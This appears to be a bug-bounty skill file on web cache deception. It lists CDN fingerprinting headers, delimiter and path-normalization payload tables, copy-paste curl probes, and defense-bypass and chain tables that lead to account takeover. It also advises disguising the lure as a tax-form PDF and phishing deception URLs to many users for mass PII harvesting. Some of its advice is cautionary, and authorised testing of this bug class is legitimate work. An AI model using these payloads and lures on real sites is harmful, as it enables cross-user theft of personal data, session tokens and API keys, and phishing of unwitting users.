---
name: web-cache-deception
category: vulnerabilities
description: Web cache deception for exfiltrating authenticated user data via path confusion, delimiter differentials, and CDN cache-key normalization differences across Cloudflare, Akamai, Varnish, CloudFront, Fastly
depends_on: []
---

# Web Cache Deception

You trick a cache into storing an authenticated response under a URL the attacker can re-request. The URL must look static to the cache and dynamic to the origin. This is a 2020-class bug, now revived by Kettle/Assetnote research on delimiter and normalization differentials across CDNs. Payable findings exfiltrate PII, tokens, or admin data cross-user.

## Attack Surface

**Required preconditions**
- A shared cache in front of the origin (CDN, reverse proxy, edge, varnish)
- Authenticated pages that render user-specific content (`/account`, `/profile`, `/settings`, `/api/me`)
- Origin accepts requests that the cache considers static (extension-based or path-based caching)
- Cache-key construction differs from origin routing

**CDN and proxy layers to fingerprint**
- Cloudflare — `CF-Cache-Status`, `CF-Ray`, `Server: cloudflare`
- Akamai — `X-Akamai-*`, `X-Cache-Key` with `Pragma: akamai-x-cache-on`
- Fastly — `X-Served-By`, `X-Cache: HIT`, `Fastly-Debug-Path`
- CloudFront — `X-Cache: Hit from cloudfront`, `Via: ... CloudFront`
- Varnish — `X-Varnish`, `Via: 1.1 varnish`
- Nginx proxy_cache — `X-Proxy-Cache: HIT`
- Azure Front Door / AWS API Gateway / custom edge caches

**Likely sinks on the origin**
- Pages where any path under a route returns the same content (`/account/profile/ANYTHING`)
- REST-ish routers that ignore trailing segments (Express `app.get('/profile')` plus greedy middleware)
- Pages that reflect user data into response body (session email, API tokens, CSRF tokens, JWTs)
- `/api/*` endpoints that match on prefix and ignore the tail
- SPAs with a universal route matcher that returns the same HTML shell (less useful unless HTML embeds secrets)

## High-Value Targets

- `/account`, `/account/settings`, `/me`, `/api/v1/me`, `/api/user`
- `/billing`, `/payments`, `/invoices`, `/orders` (CC last4, addresses)
- `/api/csrf`, `/api/session`, `/api/bootstrap` returning JSON with tokens
- Admin endpoints (`/admin/*`) accessible only to admins — deception lets attacker fetch them via a victim-admin
- OAuth token reveal endpoints (`/api/tokens`, `/developer/api-keys`)

## Cache-Key vs Origin-Routing Differential (the core idea)

Cache decides "is this static?" by one of:
- File extension at the end of the path (`.css`, `.js`, `.png`, `.svg`, `.woff`)
- Prefix match (`/static/`, `/assets/`, `/_next/static/`)
- Content-Type in the response
- `Cache-Control` header from origin

Origin decides "what to return" by:
- Routing table (regex/prefix match)
- Middleware that strips trailing `;params` or `#fragments` or normalizes
- 404 handler that falls back to the SPA shell or profile template

When these disagree, deception is possible. You want a URL that the cache reads as `/profile/x.css` (static, cache it) and the origin reads as `/profile` (dynamic, return user data).

## Key Vulnerabilities

### Classic path extension

- Request: `GET /account/profile/x.css HTTP/1.1`
- Origin returns the profile page (router ignores the tail)
- Cache sees `.css`, stores the response for 5 min (default)
- Attacker re-requests `/account/profile/x.css` from a clean browser — served from cache with victim's data.

### Delimiter differentials (the 2024 Kettle class)

Certain delimiters are interpreted by the origin framework but NOT stripped by the CDN cache key:
- Semicolon in Tomcat/Spring: `/account/profile;.css` → origin strips `;.css`, sees `/account/profile`; cache keys the full string.
- Hash fragment smuggled in path: `/account/profile%23.css` → some CDNs decode %23, strip from routing key; origin treats as literal char.
- Newline / control chars: `/account/profile%0a.css` (Fastly historical)
- Matrix parameters `;x=y` on Java stacks
- Double slash `//` — origin normalizes to single slash, cache does not
- Encoded slash `%2f` — origin URL-decodes, cache does not (and vice versa)
- Backslash `\` — nginx normalizes on some configs, upstream does not

### Static directory traversal

- `/static/..%2faccount/profile` — origin resolves to `/account/profile`, cache keys the leading `/static/` and caches as static.
- Variants: `/static/../account`, `/static/%2e%2e/account`, `/assets/..;/account`

### Query string pollution for cache key

- `?utm_source=anything.css` — if cache strips query but origin honors it, no effect. Reverse: cache uses query in key, origin ignores — attacker can generate unique cache keys that still return victim data.
- `;extension=.css` matrix param — Tomcat ignores it; cache keys it.

### Response header trust

- Origin sets `Cache-Control: no-store` but CDN overrides with page rules or `surrogate-control`.
- Origin sets nothing; CDN default policy caches based on extension.

### Mobile / API versions

- Mobile endpoints sometimes disable cache headers but sit behind the same CDN. Test `/mobile/account` equivalents.

## Cache Rules To Probe (cheat sheet)

```
Cloudflare default: cache by extension in
[css, js, jpg, jpeg, gif, png, ico, svg, woff, woff2, ttf, eot, pdf, zip, txt]
Edge TTL: 2h default, overridable by origin Cache-Control or Page Rules

Akamai: rules in Property Manager; test each extension + check X-Cache-Key on debug

Varnish: default VCL caches if no Set-Cookie and no Authorization header on response
  Common misconfig: response strips Set-Cookie in a VCL rewrite -> everything cacheable

CloudFront: cache behavior per path pattern; default forwards cookies OFF -> cache key
  ignores session. If origin response lacks Cache-Control, uses minimum TTL 86400s.

Fastly: VCL-based, test Fastly-Debug-Path and Surrogate-Key response header
```

## PoC Testing Methodology

1. **Fingerprint the cache** — hit any static asset twice and read `Age`, `X-Cache`, `CF-Cache-Status`, `X-Served-By`. Confirm HIT on second request.
2. **List authenticated pages with renderable secrets** — load `/account`, `/settings`, `/billing`, `/api/me` while logged in; verify response contains user data you can assert on (email, CC last4, API key, CSRF token).
3. **Static probe** — append `/x.css`, `/x.js`, `/x.png` to each authenticated path. Record HTTP status, content, and whether response body still contains the secret.
4. **Cache probe** — repeat the request with `-I` and observe `Cache-Control`, `Age`, `CF-Cache-Status`. If the second request shows HIT and body identical, cacheable.
5. **Clean-session verification** — clear cookies or use a separate browser profile, request the exact deception URL, confirm you receive the victim's body (use your second test account as the victim).
6. **Delimiter sweep** — when `.css` alone fails, sweep `;`, `%3b`, `%23`, `%00`, `%0a`, `\\`, `..%2f` combinations.
7. **Different origins** — test subdomains: `api.target.com`, `mobile.target.com`, staging/canary; each may have different cache config.
8. **TTL measurement** — note `Age` growth to measure cache TTL; you need to land the victim's fetch before your next fetch.

## PoC Mechanics (copy-paste)

Check cacheability:
```bash
# As victim (authenticated)
curl -si -b cookies.txt "https://target/account/settings/x.css" | head -n 20

# As attacker (clean)
curl -si "https://target/account/settings/x.css" | head -n 20
# Look for secret in body + CF-Cache-Status: HIT
```

Verify cache key differential on Cloudflare:
```bash
for ext in css js png svg woff2 ico; do
  curl -si "https://target/account/me/probe.$ext" | \
    grep -E "^(HTTP|cf-cache-status|content-length|age)"
done
```

Force cache population from victim side (the email/link attacker sends):
```
https://target.com/account/profile/tax-form-2026.pdf
```
(Innocent-looking URL — semantic camouflage matters for the delivery.)

## Defense-Bypass Pairs

| Defense | Bypass | Corpus Evidence |
|---------|--------|----------------|
| Extension whitelist (`.css`/`.js` only) | Uncommon cached exts: `.map`, `.webmanifest`, `.avif`, `.webp`, `.wasm`, `.ico`, `.txt`, `.xml`, `.mp4` | H1 #1271944: `.css` worked; also test `.json` on Cloudflare page-rule configs |
| `Cache-Control: private` on dynamic pages | 404 handler returns personalized HTML without `Cache-Control` | H1 #1271944: Shopify 404 cached PII despite dynamic origin intent |
| Single-pass URL normalization | Double-encode: `%252F` decodes to `%2F` then `/`; cache sees 1 decode, origin sees 2 | H1 #1271944 (hatchful variant): `%25%32%46` bypassed single-pass normalizer |
| Path blocked by WAF / route guard | Static-prefix traversal: `/static/..%2f..%2faccount` — cache keys `/static/`, origin resolves `/account` | General: CDN trusts prefix, origin resolves traversal |
| `Vary: Cookie` on all responses | Find endpoints where `Vary` is missing or set to `Accept-Encoding` only — error pages, API JSON, health checks | H1 #1698316: Expedia ATO via endpoint missing Vary |
| Semicolon stripping by CDN | Encoded semicolon `%3b` or matrix param `..;/` — some CDNs decode only selectively | IIS/Tomcat stacks: `..;/static/x.css` bypasses CDN strip |
| CDN rejects paths with `%00` | Substitute `%0a` (newline), `%0d` (CR), `%09` (tab) — each CDN handles differently | Google VRP #167211008: bare CR passed through GC Classic LB |
| Origin rejects unknown extensions with 404 | Use `%23` (encoded `#`) before extension: `/account/profile%23.css` — origin strips fragment, returns profile | Kettle 2024 delimiter research |
| Short cache TTL (< 60s) | Automate: script re-poisons every TTL cycle; or target long-TTL static prefix paths | H1 #824078373: automated re-poisoning at scale |
| Content-Type-based caching (not extension) | Force `Accept: text/css` header; some origins respond with `text/html` but CDN overrides type check | Cloudflare page rules can override Content-Type matching |
| HSTS / forced HTTPS | `X-Forwarded-Proto: http` triggers cached redirect loop — the loop IS the damage | H1 #1181946, H1 #409370: HackerOne, Shopify DoS via cached redirect |

## Chain Patterns

| Chain | Steps | Impact |
|-------|-------|--------|
| WCD -> CSRF token theft -> state change | Cache `/account` with victim CSRF token; extract token; replay against state-changing endpoint | H1 #1271944: Shopify PII + CSRF leak ($800) |
| WCD -> session token -> ATO | Cache page with embedded JWT/session in `__INITIAL_STATE__`; extract; replay | H1 #1698316: Expedia ATO ($750) |
| WCD -> API key theft -> data exfil | Cache `/developer/keys` or `/api/integrations`; extract static API tokens | API-key endpoints on any SPA with JSON state embedding |
| WCD -> OAuth code -> ATO | Post-auth redirect to cacheable URL with `code=` in body/query | OAuth flows that land on CDN-cached redirect URIs |
| WCD + XSS -> mass stored XSS | XSS payload on a static-extension path gets cached; every user hit during TTL | H1 #1760213: cache poisoning + cookie XSS -> ATO at scale |
| WCD + smuggling -> persistent deception | HTTP smuggling seeds victim-targeted deception URL into CDN | H1 #919175: Basecamp TE/TE smuggling -> cached redirect |
| WCD -> PII mass harvest | Phish deception URL to N users; scrape each cached body during TTL | Linear scaling: one deception URL per victim |
| WCD + subdomain takeover -> JS replacement | Static CDN domain taken over; attacker controls cached JS served from trusted origin | CDN domain expired -> attacker registers -> serves malicious cached responses |

## CDN/Proxy Path Normalization Matrix

| CDN/Proxy | Path Decoding | Dot-Segment Resolution | Delimiter Handling | Deception Technique |
|-----------|--------------|----------------------|-------------------|-------------------|
| Cloudflare | Single URL-decode | Resolves `..` before routing | Semicolons preserved in key | Append `/x.css` — extension triggers caching rule |
| Akamai | Configurable per property | Resolves `..` pre-origin | Matrix params `;key=val` forwarded | Property Manager rules: test each ext + `Pragma: akamai-x-cache-on` debug |
| Fastly | VCL-driven, single decode | VCL controls normalization | VCL regex may miss encoded delimiters | Surrogate-Key purge if accessible; test `%2f` vs `/` |
| CloudFront | Single decode, preserves `%2F` | Does NOT resolve `..` by default | Query forwarding per-behavior | `/static/..%2faccount` — CF forwards traversal to origin |
| Varnish | No decode by default | VCL `regsub` may normalize | Strips nothing unless VCL says so | `/account/x.css` when `beresp` strips `Set-Cookie` |
| Nginx (proxy_cache) | Normalizes `//` to `/`, decodes `%2F` | Resolves `..` in some configs | Backslash `\` normalized on some configs | `proxy_cache_key` misconfig: keys on decoded path |
| Apache Traffic Server | Preserves URL fragments (CVE-2021-27577) | `#` forwarded to origin | Fragments in cache key differ from forwarded URL | `/path#/admin` — cache keys `/path`, origin gets fragment |
| GCP Classic ALB | Does NOT strip bare CR from method | Normalizes cache key but forwards raw bytes | Bare CR (`\r`) after method passes through | `GET\r /index.html` -> 501 cached under key `/index.html` (GVRP $500K) |
| Azure CDN (Standard) | Single decode | Resolves `..` | `Authorization` header causes 403 on Azure Storage | `Authorization: garbage` -> cached 403 blocks downloads |
| IIS | Decodes `%2f`, treats `\` as `/` | Resolves `..;/` as path parameter | Semicolons as matrix params | `/account\settings.css` or `/account/..;/static/x.css` |

## Cache Key Manipulation

| Technique | What Changes | Effect | Example |
|-----------|-------------|--------|---------|
| Extension append | Adds static ext to dynamic path | CDN sees static, origin ignores tail | `/account/profile/x.css` |
| Encoded slash double-decode | `%252F` -> `%2F` -> `/` across layers | Cache keys encoded form, origin resolves slash | `/account%252Fprofile%252Fx.css` |
| Delimiter semicolon | `;` treated as param separator by origin | Origin strips `;.css`, cache keys full string | `/account/profile;.css` (Tomcat/Spring) |
| Fragment encoding | `%23` (encoded `#`) before extension | Origin may strip fragment, cache sees literal | `/account/profile%23.css` |
| Static prefix traversal | Prepend cached prefix + `..%2f` | Cache keys prefix, origin resolves to target | `/static/..%2f..%2faccount/settings` |
| Query as extension | `?x.css` suffix | Some caches key query, origin ignores for routing | `/account/profile?x.css` |
| Matrix parameter | `;x=1` in path before extension | Java stacks strip matrix params, cache preserves | `/account/profile;x=1/x.css` |
| Backslash confusion | `\` as path separator on IIS | IIS treats `\` as `/`, cache treats as literal | `/account\settings.css` |
| Null byte | `%00` before extension | Origin truncates at null, cache sees full path | `/account/settings%00.css` |
| Newline/CR injection | `%0a` or `%0d` in path | Some CDNs pass through, origin may normalize | `/account/profile%0a/x.css` |

## Bypass Techniques

**Extension set expansion**
- Uncommon but cached: `.map`, `.webmanifest`, `.json` (Cloudflare page rules on some configs), `.ico`, `.txt`, `.xml`, `.wasm`, `.avif`, `.webp`, `.mp4`.

**Path-prefix cache rules**
- Many apps cache everything under `/static/`, `/assets/`, `/_next/`, `/public/`. Use traversal to reach `/account` while appearing to live under that prefix.
- `/static/..%2f..%2faccount/settings`

**Charset / encoding**
- Double-encode: `/account%252fprofile%252fx.css` — cache decodes once (thinks path is normal), origin decodes again.
- Mixed encoded/raw slashes: `/account%2fprofile/x.css`

**Bypass normalization differences**
- Trailing newline / CR: `/account/profile%0a/x.css`
- Parameter suffix: `/account/profile?x.css` (some caches key the query but origin ignores it for routing)
- Matrix param: `/account/profile;x=1/x.css`

**Header-driven caching**
- Force `Accept: text/css` on a page that responds `text/html`; observe if Vary is respected.
- Some CDNs cache on `Accept-Encoding` only; useful when the origin returns user-specific HTML.

**Authentication coupling**
- If CDN caches only when no `Authorization:` header or no `Set-Cookie` in response, look for pages that use session cookies on the client but the response omits `Set-Cookie` — those are cacheable.

## Validation

1. Victim's session visits the deception URL, response contains their personal data (email, full name, CSRF token, API key, addresses).
2. In a clean, unauthenticated context, the same URL returns the victim's data with a cache HIT header.
3. Response headers show the CDN caching layer (`CF-Cache-Status: HIT`, `X-Cache: Hit from cloudfront`, `Age: N`).
4. Clear evidence the exposed data is cross-user: different account-A fetching account-B's data.
5. Document TTL: how long the cache entry lives, and how an attacker maintains a fresh copy.

## False Positives

- Response contains no user-specific data — cached page is generic, no impact.
- `Cache-Control: private, no-store, max-age=0` actually honored end-to-end by every layer — not cacheable.
- Appeared to work but HIT was from your own browser cache, not the shared cache. Use incognito + a different ASN to confirm.
- Origin 404s on the deception URL and you mistook the CDN's cached 404 for a success.
- `Vary: Cookie` respected — CDN caches per-cookie, so each user has their own key and no cross-user leak.
- Response includes `Set-Cookie` — Cloudflare / Varnish default policies refuse to cache these; you may see HIT on static-looking paths but the dynamic path is bypassed.
- Triager pushback: "requires victim to click attacker URL" — social-engineer framing is fine; preempt with a plausible lure (shared document, tax form, invoice PDF).
- Triager pushback: "CDN config is by design" — point to the cross-user exposure; impact is the argument, not the design label.

## Chaining

- **WCD → CSRF bypass**: cached response contains `<meta name="csrf-token" value="...">`. Attacker reads victim's CSRF token, replays with session-adjacent attack (if they have any other cookie leak).
- **WCD → API key theft → ATO**: cached `/developer/keys` or `/api/integrations` leaks static tokens; attacker reuses them for API-level ATO.
- **WCD → OAuth code exposure**: if post-auth redirect lands on a cacheable URL with `code=` in query or body, attacker retrieves a valid code.
- **WCD → PII mass-exfiltration**: phish the deception URL to many users via mass email; attacker re-crawls and harvests each cached body.
- **WCD + subdomain takeover**: the static domain holding the cache is taken over; attacker controls what gets served and replaces with JS payload served as cached content.
- **WCD + XSS**: XSS on a static-extension path gets cached; every user requesting that URL during TTL receives the malicious JS.

## Impact

- Cross-user disclosure of PII, addresses, CC last4, government IDs
- Session / CSRF / OAuth token theft enabling account takeover
- API key exposure with downstream account or data impact
- Administrative data leak when the cached URL is fetched by an admin
- Mass exploitation scales linearly with how many victims visit the deception URL during cache TTL

## Pro Tips

1. Always use two independent sessions to validate: one authenticated (victim), one clean (attacker), different IPs if possible.
2. `Age: N` growing across requests is the cleanest signal the cache is serving from store.
3. Pages that render `<script>window.__INITIAL_STATE__ = {...}</script>` in HTML are especially valuable — they dump the entire user JSON.
4. Delimiter-differential bugs (semicolon, %23, %2f) beat vanilla `.css` probes on modern CDNs; test them in the same sweep.
5. Cloudflare's "Cache Everything" page rule is the single biggest source — check if the target has custom rules by looking for unusual extensions caching.
6. If `Vary: Cookie` is set everywhere, move on — cross-user delivery is unlikely without CDN misconfig.
7. Purge the test poisoned URL after PoC (Cloudflare dashboard / Akamai / admin endpoint) so real users do not land on stale PoC content — note it in the report.
8. Variants per region: CDN POPs cache independently. A HIT in one region may be MISS in another; confirm from the region you expect victims to be.
9. 404 pages are the most overlooked WCD sink. If the origin returns a personalized 404 (with username, CSRF token, or nav bar), it is cacheable when the CDN sees a static extension. H1 #1271944 was exactly this pattern.
10. Use unique cache-buster query params (`?cb=rand123`) during testing so you do not poison production cache for real users. Remove the buster only for the final cross-user confirmation.
11. After finding one WCD path, sweep every subdomain under the same CDN config: `api.target`, `mobile.target`, `help.target`, `hatchful.target` — each may have different cache rules and different 404 handlers.
12. When CDN caches based on Content-Type instead of extension, look for endpoints that return `application/json` with `Cache-Control: public` — API responses with user data cached publicly are the JSON equivalent of WCD.

## Summary

Web cache deception turns an extension/delimiter/normalization differential into authenticated-data exfil. Fingerprint the cache, enumerate dynamic pages with secrets, sweep static-looking variants and delimiters, and prove cross-user delivery with a clean second session. The report lives on: the delimiter used, the CDN behavior confirmed by response headers, and the exact data exposed.
